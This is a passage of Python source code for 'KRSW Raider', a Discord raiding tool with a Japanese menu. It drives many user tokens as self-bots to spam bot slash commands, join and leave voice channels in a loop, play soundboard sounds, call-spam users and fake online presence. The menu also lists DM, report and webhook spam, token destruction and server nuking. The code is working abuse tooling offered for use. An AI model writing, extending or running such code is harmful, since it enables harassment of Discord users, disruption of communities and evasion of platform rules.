                        {"type": 3, "name": "choice_s", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_s"},
                        {"type": 3, "name": "choice_t", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_t"}
                    ],
                    "integration_types": [0],
                    "global_popularity_rank": 1,
                    "description_localized": "Create a new poll.",
                    "name_localized": "poll"
                }
            },
            "attachments": []
        }
            while True:
                try:
                    r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                    if r.status_code == 204:
                        cls.log("success", "SENT", token)
                    elif r.status_code == 401:
                        cls.log("error", "DEAD", token)
                    elif r.status_code == 403:
                        cls.log("error", "NOT ACCESS", token)
                    elif r.status_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    else:
                        cls.log("error", "ERROR", token)
                    time.sleep(int(float(delay)))
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def aki(cls, token, guild, channel, message, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            payload = {
                "type": 2,
                "application_id": "356065937318871041",
                "guild_id": str(guild),
                "channel_id": str(channel),
                "session_id": str(sessionid),
                "data": {
                    "version": "1060480581261070337",
                    "id": "1060480581261070336",
                    "name": "say",
                    "type": 1,
                    "options": [{"type": 3, "name": "content", "value": str(message)}],
                    "application_command": {
                        "id": "1060480581261070336",
                        "type": 1,
                        "application_id": "356065937318871041",
                        "version": "1060480581261070337",
                        "name": "say",
                        "description": "What do you want me to say?",
                        "options": [
                            {
                                "type": 3,
                                "name": "content",
                                "description": "What do you want me to say?",
                                "required": True,
                                "description_localized": "What do you want me to say?",
                                "name_localized": "content",
                            }
                        ],
                        "dm_permission": True,
                        "integration_types": [0],
                        "global_popularity_rank": 2,
                        "description_localized": "What do you want me to say?",
                        "name_localized": "say",
                    },
                    "attachments": [],
                },
                "nonce": None,
                "analytics_location": "slash_ui",
            }
            while True:
                try:
                    r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                    if r.status_code == 204:
                        cls.log("success", "SENT", token)
                    elif r.status_code == 401:
                        cls.log("error", "DEAD", token)
                    elif r.status_code == 403:
                        cls.log("error", "NOT ACCESS", token)
                    elif r.status_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    else:
                        cls.log("error", "ERROR", token)
                    time.sleep(int(float(delay)))
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)


    @classmethod
    def fredboat(cls, token, guild, channel, message, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            payload =  {"type":2,"application_id":"184405253028970496","guild_id":str(guild),"channel_id":str(channel),"session_id":str(sessionid),"data":{"version":"1153626946589175818","id":"1102875264737890346","name":"text","type":1,"options":[{"type":1,"name":"say","options":[{"type":3,"name":"message","value":str(message)}]}],"application_command":{"id":"1102875264737890346","type":1,"application_id":"184405253028970496","version":"1153626946589175818","name":"text","description":"Send random text","options":[{"type":1,"name":"github","description":"Link to github","required":False,"description_localized":"Link to github","name_localized":"github"},{"type":1,"name":"shrug","description":"Send a shrug","required":False,"description_localized":"Send a shrug","name_localized":"shrug"},{"type":1,"name":"faceofdisapproval","description":"Send face of disapproval","required":False,"description_localized":"Send face of disapproval","name_localized":"faceofdisapproval"},{"type":1,"name":"sendenergy","description":"Send energy","required":False,"description_localized":"Send energy","name_localized":"sendenergy"},{"type":1,"name":"dealwithit","description":"Send deal with it","required":False,"description_localized":"Send deal with it","name_localized":"dealwithit"},{"type":1,"name":"channelingenergy","description":"Send channeling energy","required":False,"description_localized":"Send channeling energy","name_localized":"channelingenergy"},{"type":1,"name":"butterfly","description":"Send a butterfly","required":False,"description_localized":"Send a butterfly","name_localized":"butterfly"},{"type":1,"name":"angrytableflip","description":"Send angry table flip","required":False,"description_localized":"Send angry table flip","name_localized":"angrytableflip"},{"type":1,"name":"dog","description":"Send dog meme","required":False,"description_localized":"Send dog meme","name_localized":"dog"},{"type":1,"name":"lewd","description":"Send lewd","required":False,"description_localized":"Send lewd","name_localized":"lewd"},{"type":1,"name":"useless","description":"This command is useless","required":False,"description_localized":"This command is useless","name_localized":"useless"},{"type":1,"name":"shrugwtf","description":"Send shrug wtf","required":False,"description_localized":"Send shrug wtf","name_localized":"shrugwtf"},{"type":1,"name":"hurray","description":"Send hurray","required":False,"description_localized":"Send hurray","name_localized":"hurray"},{"type":1,"name":"spiderlenny","description":"Send spider lenny","required":False,"description_localized":"Send spider lenny","name_localized":"spiderlenny"},{"type":1,"name":"lenny","description":"Send lenny","required":False,"description_localized":"Send lenny","name_localized":"lenny"},{"type":1,"name":"peeking","description":"Send peeking lenny","required":False,"description_localized":"Send peeking lenny","name_localized":"peeking"},{"type":1,"name":"eagleoflenny","description":"Send eagle of lenny","required":False,"description_localized":"Send eagle of lenny","name_localized":"eagleoflenny"},{"type":1,"name":"lennygang","description":"Send lenny gang","required":False,"description_localized":"Send lenny gang","name_localized":"lennygang"},{"type":1,"name":"say","description":"Make the bot echo something.","required":False,"options":[{"type":3,"name":"message","description":"Message to echo","required":True,"autocomplete":False,"description_localized":"Message to echo","name_localized":"message"}],"description_localized":"Make the bot echo something.","name_localized":"say"},{"type":1,"name":"riot","description":"Start a riot","required":False,"options":[{"type":3,"name":"text","description":"Text in center","required":False,"autocomplete":False,"description_localized":"Text in center","name_localized":"text"}],"description_localized":"Start a riot","name_localized":"riot"},{"type":1,"name":"magic","description":"This command is magic ( ͡° ͜ʖ ͡°)","required":False,"options":[{"type":3,"name":"message","description":"Message to send","required":False,"autocomplete":False,"description_localized":"Message to send","name_localized":"message"}],"description_localized":"This command is magic ( ͡° ͜ʖ ͡°)","name_localized":"magic"}],"dm_permission":True,"integration_types":[0],"global_popularity_rank":16,"description_localized":"Send random text","name_localized":"text"},"attachments":[]},"nonce":None,"analytics_location":"slash_ui"}
            while True:
                try:
                    r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                    if r.status_code == 204:
                        cls.log("success", "SENT", token)
                    elif r.status_code == 401:
                        cls.log("error", "DEAD", token)
                    elif r.status_code == 403:
                        cls.log("error", "NOT ACCESS", token)
                    elif r.status_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    else:
                        cls.log("error", "ERROR", token)
                    time.sleep(int(float(delay)))
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)


    @classmethod
    def other(cls, token, guild, channel, bot, slashname, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            r = session.get(f"https://discord.com/api/v9/guilds/{guild}/application-command-index", headers=headers)
            command_list = r.json()["application_commands"]
            for command in command_list:
                if command["application_id"] == str(bot) and command["name"] == str(slashname):
                    slashcommand = command
                    break
            payload = {"type": 2,"application_id": slashcommand["application_id"],"guild_id": str(guild),"channel_id": str(channel),"session_id": str(sessionid),"data": {"version": slashcommand["version"],"id": slashcommand["id"],"name": slashcommand["name"],"type": 1,"options": [],"application_command": slashcommand,"attachments": []},"nonce": None}
            while True:
                try:
                    r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                    if r.status_code == 204:
                        cls.log("success", "SENT", token)
                    elif r.status_code == 401:
                        cls.log("error", "DEAD", token)
                    elif r.status_code == 403:
                        cls.log("error", "NOT ACCESS", token)
                    elif r.status_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    else:
                        cls.log("error", "ERROR", token)
                    time.sleep(int(float(delay)))
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def vc_spammer(cls, token, guild, channel):
        try:
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
            hello = json.loads(ws.recv())
            ws.send(json.dumps({"op": 2, "d": {"token": token, "properties": {"$os": "windows", "$browser": "Discord", "$device": "desktop"}}}))
            ws.send(json.dumps({"op": 4, "d": {"guild_id": guild, "channel_id": channel, "self_mute": False, "self_deaf": False}}))
            ws.send(json.dumps({"op": 18, "d": {"type": "guild", "guild_id": guild, "channel_id": channel, "preferred_region": "singapore"}}))
            while True:
                try:
                    time.sleep(1)
                    ws.send(json.dumps({"op": 4, "d": {"guild_id": guild, "channel_id": None, "self_mute": False, "self_deaf": False}}))
                    cls.log("success", "DISCONNECT", token)
                    time.sleep(1)
                    ws.send(json.dumps({"op": 4, "d": {"guild_id": guild, "channel_id": channel, "self_mute": False, "self_deaf": False}}))
                    cls.log("success", "CONNECT", token)
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def vc_joiner(cls, token, guild, channel):
        try:
            while True:
                try:
                    ws = websocket.WebSocket()
                    ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                    ws.send(json.dumps({"op": 2, "d": {"token": token, "properties": {"$os": "windows", "$browser": "Discord", "$device": "desktop"}}}))
                    ws.send(json.dumps({"op": 4, "d": {"guild_id": guild, "channel_id": channel, "self_mute": False, "self_deaf": False}}))
                    cls.log("success", "CONNECT", token)
                    time.sleep(10)
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def vc_rapper(cls, token, channel):
        try:
            while True:
                try:
                    headers = {"Authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"}
                    sounds = [{"sound_id": "1","emoji_id": None,"emoji_name": "🦆"},{"sound_id": "2","emoji_id": None,"emoji_name": "🔊"},{"sound_id": "3","emoji_id": None,"emoji_name": "🦗"},{"sound_id": "4","emoji_id": None,"emoji_name": "👏"},{"sound_id": "5","emoji_id": None,"emoji_name": "🎺"},{"sound_id": "7","emoji_id": None,"emoji_name": "🥁"}]
                    r = session.post(f"https://discord.com/api/v9/channels/{channel}/send-soundboard-sound", headers=headers, json=random.choice(sounds))
                    if r.status_code == 204:
                        cls.log("success", "PLAY", token)
                    elif r.status_code == 401:
                        cls.log("error", "DEAD", token)
                    elif r.status_code == 403:
                        cls.log("error", "NOT ACCESS", token)
                    elif r.statu25_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    else:
                        cls.log("error", "ERROR", token)
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def vc_streamer(cls, token, guild, channel):
        try:
            bot = commands.Bot(command_prefix='', self_bot=True)
            @bot.event
            async def on_ready():
                server = bot.get_guild(int(guild))
                vc_channel = server.get_channel(int(channel))
                vc = await vc_channel.connect()
                cls.log("success", "CONNECT", token)
                vc.play(discord.FFmpegOpusAudio(executable="ffmpeg\\ffmpeg.exe", source="data\\audio.mp3"))
                cls.log("success", "PLAY", token)
                audio_info = MP3("data\\audio.mp3")
                await asyncio.sleep(audio_info.info.length)
                await vc.disconnect()
                cls.log("success", "DISCONNECT", token)
                await bot.close()
            bot.run(token,log_handler=None, log_formatter=None, log_level=None)
        except:
            pass

    @classmethod
    def call_spammer(cls, token, user):
        channel = cls.dm(token, user)
        cls.vc_spammer(token, None, channel)

class Onliner:
    
    @classmethod
    def activity(cls, choice, gamename):
        activities = {
            "Playing": (0, ["Minecraft", "Badlion", "Roblox", "The Elder Scrolls: Online", "DCS World Steam Edit"]),
            "Streaming": (1, ["CTKP ON TOP"], "https://discord.gg/ctkp"),
            "Listening": (2, ["Spotify", "Deezer", "Apple Music", "YouTube", "SoundCloud", "Pandora", "Tidal", "Amazon Music", "Google Play Music", "Apple Podcasts", "iTunes", "Beatport"]),
            "Watching": (3, ["YouTube", "Twitch"])
        }
        if choice in activities:
            activity = activities[choice]
            if len(activity) == 2:
                type, names = activity
                url = None
            elif len(activity) == 3:
                type, names, url = activity
            name = random.choice(names)
            return {"name": name, "type": type, "url": url} if url else {"name": name, "type": type}
        elif choice == "5":
            return {"name": gamename, "type": 0}
        return None

    @classmethod
    def status(cls, status):
        status_map = {"1": "online", "2": "idle", "3": "dnd", "4": "mobile"}
        return status_map.get(status, status)

    @classmethod
    def onliner(cls, token, choice, status, gamename=None):
        try:
            c = 0
            choice = random.choice(["Playing", "Streaming", "Watching", "Listening"]) if choice is True else choice
            status = random.choice(["online", "dnd", "idle", "mobile"]) if status is True else cls.status(status)

            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            w_json = json.loads(ws.recv())
            heartbeat_interval = w_json['d']['heartbeat_interval']

            game = cls.activity(choice, gamename)
            properties = {"$os": "Windows", "$browser": "Discord iOS", "$device": "Discord iOS"} if status == "mobile" else {"$os": "Windows"}
            status = "online" if status == "mobile" else status
            auth = {
                "op": 2,
                "d": {"token": token, "properties": properties, "presence": {"game": game, "status": status, "since": 0, "afk": False}},
                "s": None,
                "t": None
            }
            ws.send(json.dumps(auth))
            Raider.log("success", "ONLINE", token)

            ack = {"op": 1, "d": None}
            while True:
                time.sleep(heartbeat_interval / 1000)
                c += 1
                Raider.log("success", "ONLINE", token)
                ws.send(json.dumps(ack))
        except Exception as e:
            Raider.log("error", str(e), token, error=True)

class Menus:

    @classmethod
    def logo(cls):
        os.system("cls" if os.name == "nt" else "clear")
        print(f"""
    \033[38;2;136;0;27m

                                    ██   ██ ██████  ███████ ██     ██     ██████   █████  ██ ██████  ███████ ██████
                                    ██  ██  ██   ██ ██      ██     ██     ██   ██ ██   ██ ██ ██   ██ ██      ██   ██
                                    █████   ██████  ███████ ██  █  ██     ██████  ███████ ██ ██   ██ █████   ██████
                                    ██  ██  ██   ██      ██ ██ ███ ██     ██   ██ ██   ██ ██ ██   ██ ██      ██   ██
                                    ██   ██ ██   ██ ███████  ███ ███      ██   ██ ██   ██ ██ ██████  ███████ ██   ██ {Style.RESET_ALL}


                                                                \033[38;2;136;0;27m{len(tokens)}{Style.RESET_ALL} Tokens Loaded
                                                                \033[38;2;136;0;27m{len(proxys)}{Style.RESET_ALL} Proxy Loaded
                                                            support: discord.gg/ctkp

            """)

    @classmethod
    def info(cls):
        os.system("cls" if os.name == "nt" else "clear")
        print("""\033[38;2;136;0;27m
                ``    .m+dlu|.d_``   `
        `   `  ` ` `((JdRMNNNMNmdMnd_(_`  `  `  `
    `   `    `   .mdNNNNMNMMMMMMMNMgMo.   ` ` `  ` `
    `    `    `,mMNMBYHNNMNs--`?HMMNNp    `        `
        `   ` ` (MNMNmNMNMNNNNMMNe(jMNMN,`     `
    `   `   ` .MMNMMMH"BYYYYWYYYYHMMNNMN/ `  `  ` `                  KRSW RAIDER
    `   `  `(XMNNb................~JMMM0: `  `
        `  ` `?UMMMb...~.~.....~.~...JMhMB=  `   `  `
    `     `.MMNW#.-(++...~..(+&--.JMmHM:`  `    `
    `   `  `  JMNg@~__..........._~.?MNNs`  `  `                   Raider version: 3.2
        `  `.MNN!.(jWe_.~.._(za,_..MNM{` ` `   `  `
    `  `    `.+M#__!(7!...~..-T3(:..(NC;     `                    created by ctkp
    `    `  .<qD_.......~.........~(#<}`  `    `
        `    ,iJ$.....~.----_.......(N(t  `   `  `
    `  `    `  _!<...~____?=!_-_~....(P!`  `  `
    `   `   ` `j_..._<?TYTT=<_...~.-!  `  `    `  `
        `   `  `?-........~........(>``   `  `
    `  `     `  `.N/~...~........~.(N+` ` `  `   ` `
    `   `   ` .dNMs-_......~~._(dMMMR. ` `  `
    `  `  `` .gdNMNHGvYiJJJJJJJUvHNNNMkNJ..``  `  `
    `` `  ...JMMmNNMN#_<?TWWHWK<<~+MNNMMNJMNNN&....  `
    .(NNNMMNM5dNNNMNr_jXMZHWHH,_jNMMNMNbdNMNNMNMNN,
    (NNMNNNM#(MMMNNNbZ>TWUHWWU?GMNNNNNNMIMNMNNNMNMb.
    `dNXMNMMNNMNgTMMMMM::(4kHXK<~jMMNMMBXgMMNMMNMMHNMY
    .dNMNMNNMNNNNN8JNNNo:~(HMM~_~dNNMNmJMNNMNNNMNNMNdM
    ,"""""""""""""?""""""""`_(T""""""""""""""""""""
                            """)

    @classmethod
    def prompt(cls, text):
        output = input(f"                    \033[38;2;136;0;27m[{Style.RESET_ALL}KRSW RAIDER\033[38;2;136;0;27m]{Style.RESET_ALL} {text} \033[38;2;136;0;27m>>>{Style.RESET_ALL} ")
        return output

    @classmethod
    def id_formatter(cls, url):
        pattern = r'https?://(?:\w+\.)?discord\.com/channels/(?P<guild>\d+)/(?P<channel>\d+)/(?P<message>\d+)'
        match = re.match(pattern, url)
        if match:
            guild = match.group('guild')
            channel = match.group('channel')
            message = match.group('message')
            return guild, channel, message
        else:
            return None

    @classmethod
    def sleep(cls):
        if settings["startime"]:
            starttime = settings["startime"]
            try:
                now = datetime.now()
                current_date = now.date()
                starttime = datetime.combine(current_date, datetime.strptime(starttime, "%H:%M").time())
                if starttime > now:
                    d_time = starttime - now
                    w_seconds = d_time.total_seconds()
                else:
                    w_seconds = 0
            except Exception as e:
                w_seconds = 0
        else:
            w_seconds = 0
        time.sleep(w_seconds)

    @classmethod
    def options(cls):
        if len(tokens) == 0:
            print("[ERROR] tokens.txtにtokenが入っていません。")

        while True:
                cls.logo()
                os.system(f"title KRSW Raider - {len(tokens)}tokens loaded - {len(proxys)}proxys loaded")
                print(f"""

\033[38;2;136;0;27m            ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m            ║                                                                                                                  ║
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}トークン チェッカー          \033[38;2;136;0;27m║    [{Style.RESET_ALL}11\033[38;2;136;0;27m] {Style.RESET_ALL}サーバー入室             \033[38;2;136;0;27m║    [{Style.RESET_ALL}21\033[38;2;136;0;27m] {Style.RESET_ALL}スラッシュコマンドスパム     \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}トークン ステータス変更      \033[38;2;136;0;27m║    [{Style.RESET_ALL}12\033[38;2;136;0;27m] {Style.RESET_ALL}サーバー退室             \033[38;2;136;0;27m║    [{Style.RESET_ALL}22\033[38;2;136;0;27m] {Style.RESET_ALL}ボタン クリック              \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}トークン アバター変更        \033[38;2;136;0;27m║    [{Style.RESET_ALL}13\033[38;2;136;0;27m] {Style.RESET_ALL}全サーバー退室           \033[38;2;136;0;27m║    [{Style.RESET_ALL}23\033[38;2;136;0;27m] {Style.RESET_ALL}フレンド申請                 \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}04\033[38;2;136;0;27m] {Style.RESET_ALL}トークン ID検索              \033[38;2;136;0;27m║    [{Style.RESET_ALL}14\033[38;2;136;0;27m] {Style.RESET_ALL}チャンネルスパム         \033[38;2;136;0;27m║    [{Style.RESET_ALL}24\033[38;2;136;0;27m] {Style.RESET_ALL}グループ連続追加             \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}05\033[38;2;136;0;27m] {Style.RESET_ALL}トークン 代名詞変更          \033[38;2;136;0;27m║    [{Style.RESET_ALL}15\033[38;2;136;0;27m] {Style.RESET_ALL}チャンネルタイパー       \033[38;2;136;0;27m║    [{Style.RESET_ALL}25\033[38;2;136;0;27m] {Style.RESET_ALL}通報スパム                   \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}06\033[38;2;136;0;27m] {Style.RESET_ALL}トークン ユーザー名スナイプ  \033[38;2;136;0;27m║    [{Style.RESET_ALL}16\033[38;2;136;0;27m] {Style.RESET_ALL}返信スパム               \033[38;2;136;0;27m║    [{Style.RESET_ALL}26\033[38;2;136;0;27m] {Style.RESET_ALL}VCスパム                     \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}07\033[38;2;136;0;27m] {Style.RESET_ALL}トークン 表示名変更          \033[38;2;136;0;27m║    [{Style.RESET_ALL}17\033[38;2;136;0;27m] {Style.RESET_ALL}スレッド作成             \033[38;2;136;0;27m║    [{Style.RESET_ALL}27\033[38;2;136;0;27m] {Style.RESET_ALL}Webhookスパム                \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}08\033[38;2;136;0;27m] {Style.RESET_ALL}トークン Hype変更            \033[38;2;136;0;27m║    [{Style.RESET_ALL}18\033[38;2;136;0;27m] {Style.RESET_ALL}ニックネーム変更         \033[38;2;136;0;27m║    [{Style.RESET_ALL}28\033[38;2;136;0;27m] {Style.RESET_ALL}通話スパム                   \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}09\033[38;2;136;0;27m] {Style.RESET_ALL}トークン 無効化              \033[38;2;136;0;27m║    [{Style.RESET_ALL}19\033[38;2;136;0;27m] {Style.RESET_ALL}サーバーDMスパム         \033[38;2;136;0;27m║    [{Style.RESET_ALL}29\033[38;2;136;0;27m] {Style.RESET_ALL}荒らしBot起動                \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║      [{Style.RESET_ALL}10\033[38;2;136;0;27m] {Style.RESET_ALL}トークン 破壊                \033[38;2;136;0;27m║    [{Style.RESET_ALL}20\033[38;2;136;0;27m] {Style.RESET_ALL}リアクションスパム       \033[38;2;136;0;27m║    [{Style.RESET_ALL}30\033[38;2;136;0;27m] {Style.RESET_ALL}このツールについて           \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m            ║                                                                                                                  ║{Style.RESET_ALL}
\033[38;2;136;0;27m            ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}


                """)

                options = {
                    "1": cls.checker, 
                    "2": cls.status_changer,
                    "3": cls.avatar_changer,
                    "4": cls.token_searcher,
                    "5": cls.pronouns_changer,
                    "6": cls.uname_changer,
                    "7": cls.globalname_changer,
                    "8": cls.hype_changer,
                    "9": cls.token_disabler,
                    "10": cls.token_fucker,
                    "11": cls.joiner,
                    "12": cls.leaver,
                    "13": cls.all_leaver,
                    "14": cls.channel_spammer,
                    "15": cls.fake_typer,
                    "16": cls.rply_sender,
                    "17": cls.thread_creator,
                    "18": cls.nick_changer,
                    "19": cls.dm_spammer,
                    "20": cls.reaction_spammer,
                    "21": cls.command_spammer,
                    "22": cls.btn_clicker,
                    "23": cls.friend_sender,
                    "24": cls.grp_creator,
                    "25": cls.report_spammer,
                    "26": cls.vc_spammer,
                    "27": cls.webhook_spammer,
                    "28": cls.call_spammer,
                    "29": cls.nuker,
                    "30": cls.info
                }
                choice = cls.prompt("メニューから選んでください")
                if choice in options:
                    options[choice]()
                    cls.prompt("Enterキーを押してメニューに戻ります")

    @classmethod
    def checker(cls):
        cls.logo()
        cls.sleep()
        print(f"                    \033[38;2;136;0;27m═══════════════════════════════════════════{Style.RESET_ALL} 有効なトークン \033[38;2;136;0;27m═══════════════════════════════════════════{Style.RESET_ALL}\n")
        ts = []
        vaildtokens = []
        with concurrent.futures.ThreadPoolExecutor() as executor:
            vaildtokens = list(executor.map(Raider.checker, tokens))
        save = cls.prompt("有効なトークンをtokens.txtに上書きしますか? [y/n]")
        if save == "y":
            vaildtoken = "\n".join(bv for bv in vaildtokens if bv is not None)
            with open('tokens.txt', 'w') as f:
                f.write(vaildtoken)

    @classmethod
    def status_changer(cls):
        cls.logo()
        choice = cls.prompt("ランダムなステータス [y/n]")
        if choice == "y":
            choice = True
            status = None
            gamename = None
        else:
            cls.logo()
            print(f"""
\033[38;2;136;0;27m                                     ╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}プレイ中                            \033[38;2;136;0;27m║ {Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}配信中                              \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}視聴中                              \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}04\033[38;2;136;0;27m] {Style.RESET_ALL}再生中                              \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}05\033[38;2;136;0;27m] {Style.RESET_ALL}その他                              \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
            choice = cls.prompt("アクティビティ")
            if choice == "5":
                gamename = cls.prompt("ゲーム名")
            else:
                gamename = None
            cls.logo()
            print(f"""
\033[38;2;136;0;27m                                     ╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}オンライン                          \033[38;2;136;0;27m║ {Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}退席中                              \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}取り込み中                          \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}04\033[38;2;136;0;27m] {Style.RESET_ALL}オンライン(モバイル版)              \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
            status = cls.prompt("ステータス")
        cls.logo()
        cls.sleep()
        ts=[]
        for token in tokens:
            t = threading.Thread(target=Onliner.onliner, args=(token, choice, status, gamename))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def avatar_changer(cls):
        cls.logo()
        cls.sleep()
        ts=[]
        for token in tokens:
            t = threading.Thread(target=Raider.avatar_changer, args=(token,))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()
    
    @classmethod
    def token_searcher(cls):
        cls.logo()
        user = cls.prompt("ユーザーID")
        cls.sleep()
        for token in tokens:
            Raider.get_info(token, user)
        
    @classmethod
    def pronouns_changer(cls):
        cls.logo()
        message = cls.prompt("代名詞")
        cls.sleep()
        ts=[]
        for token in tokens:
            t = threading.Thread(target=Raider.pronouns_changer, args=(token, message))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()
    
    @classmethod
    def uname_changer(cls):
        cls.logo()
        token = cls.prompt("トークン")
        pw = cls.prompt("パスワード")
        uname = cls.prompt("ユーザー名")
        cls.logo()
        cls.sleep()
        Raider.name_changer(token, uname, pw)

    @classmethod
    def globalname_changer(cls):                    
        cls.logo()
        cls.sleep()
        ts=[]
        globalname = cls.prompt("名前")
        for token in tokens:
            t = threading.Thread(target=Raider.global_name_changer, args=(token, globalname))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def hype_changer(cls):                
        cls.logo()
        randhype = cls.prompt("ランダムなHypeSquad? [y/n]")
        cls.sleep()
        ts=[]
        if randhype == "y":
            for token in tokens:
                t = threading.Thread(target=Raider.hype_changer, args=(token,random.randint(1, 3)))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        else:
            cls.logo()
            print(f"""
\033[38;2;136;0;27m                                     ╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}bravery                             \033[38;2;136;0;27m║ {Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}brillance                           \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}balance                             \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
            hype = cls.prompt("HypeSquad")
            cls.logo()
            cls.sleep()
            for token in tokens:
                t = threading.Thread(target=Raider.hype_changer, args=(token,int(hype)))
